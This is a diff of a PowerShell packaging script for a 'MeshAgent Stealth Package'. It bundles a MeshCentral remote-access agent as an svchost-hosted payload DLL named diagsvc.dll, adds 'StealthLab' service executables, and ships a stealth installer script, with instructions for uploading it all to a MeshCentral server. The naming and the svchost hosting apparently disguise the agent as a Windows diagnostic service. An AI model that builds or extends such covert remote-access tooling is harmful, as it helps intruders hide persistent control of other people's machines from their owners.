@@ -54,6 +54,8 @@ $toolsDir      = Join-Path $projectRoot "tools"
 $embedScript   = Join-Path $toolsDir "embed_provisioning_simple.ps1"
 $dumpbinPath   = "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\dumpbin.exe"
 
+. (Join-Path $toolsDir "ResourceProbe.ps1")
+
 if (-not (Test-Path $msbuildPath)) {
     throw "MSBuild not found at '$msbuildPath'. Install Visual Studio build tools or update path."
 }
@@ -153,6 +155,27 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package content
 
     Copy-Item -Path $dllOutput -Destination (Join-Path $script:packageDir "diagsvc.dll") -Force
 
+    $stealthExeX64 = Join-Path $projectRoot "meshservice\x64\StealthLab\MeshService-2022.exe"
+    if (Test-Path $stealthExeX64) {
+        if (-not (Test-SvchostPayload -Path $stealthExeX64)) {
+            throw "MeshService-2022.exe (x64) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
+        }
+        Copy-Item -Path $stealthExeX64 -Destination (Join-Path $script:packageDir "MeshService64.exe") -Force
+        Write-Note "Added MeshService64.exe (svchost-enabled executable)"
+    }
+    else {
+        Write-Note "MeshService-2022.exe (x64) missing; MeshService64.exe not included" ([ConsoleColor]::DarkYellow)
+    }
+
+    $stealthExeWin32 = Join-Path $projectRoot "meshservice\StealthLab\MeshService-2022.exe"
+    if (Test-Path $stealthExeWin32) {
+        if (-not (Test-SvchostPayload -Path $stealthExeWin32)) {
+            throw "MeshService-2022.exe (Win32) missing SVCHOSTDLL resource. Re-run build.ps1 -StealthLab."
+        }
+        Copy-Item -Path $stealthExeWin32 -Destination (Join-Path $script:packageDir "MeshService.exe") -Force
+        Write-Note "Added MeshService.exe (svchost-enabled Win32 executable)"
+    }
+
     $optionalFiles = @(
         @{ Source = Join-Path $projectRoot "WinDiagnosticHost.msh"; Destination = "WinDiagnosticHost.msh"; Description = ".msh provisioning file" },
         @{ Source = Join-Path $projectRoot "deploy_stealth_agent.ps1"; Destination = "install.ps1"; Description = "installer helper script"; Optional = $true },
@@ -173,6 +196,10 @@ Write-Step -Index ($step++) -Total $totalSteps -Label "Preparing package content
     }
 
     $dllInfo = Get-Item $dllOutput
+    $win32ReadmeLine = ""
+    if (Test-Path (Join-Path $script:packageDir "MeshService.exe")) {
+        $win32ReadmeLine = "- MeshService.exe          : svchost-enabled service executable (Win32)`n"
+    }
     $readme = @"
 MeshAgent Stealth Package
 =========================
@@ -190,7 +217,8 @@ INSTALLATION NOTES
 FILES
 -----
 - diagsvc.dll              : MeshAgent svchost payload
-- WinDiagnosticHost.msh    : Provisioning data
+- MeshService64.exe        : svchost-enabled service executable (x64)
+${win32ReadmeLine}- WinDiagnosticHost.msh    : Provisioning data
 - install.ps1              : Optional local installer helper
 - branding_config.json     : Branding configuration used for the build
 
@@ -232,6 +260,6 @@ if ($script:dllHash) {
 Write-Host ""
 Write-Host "Next steps:" -ForegroundColor Yellow
 Write-Host "1. Upload diagsvc.dll to the MeshCentral agents-custom directory." -ForegroundColor White
-Write-Host "2. Rename it to meshagent_win32_x64.exe and set permissions." -ForegroundColor White
+Write-Host "2. For executable overrides, use MeshService64.exe (and MeshService.exe if required) in meshcentral-data\agents." -ForegroundColor White
 Write-Host "3. Restart the MeshCentral service and download the agent." -ForegroundColor White
 Write-Host ""
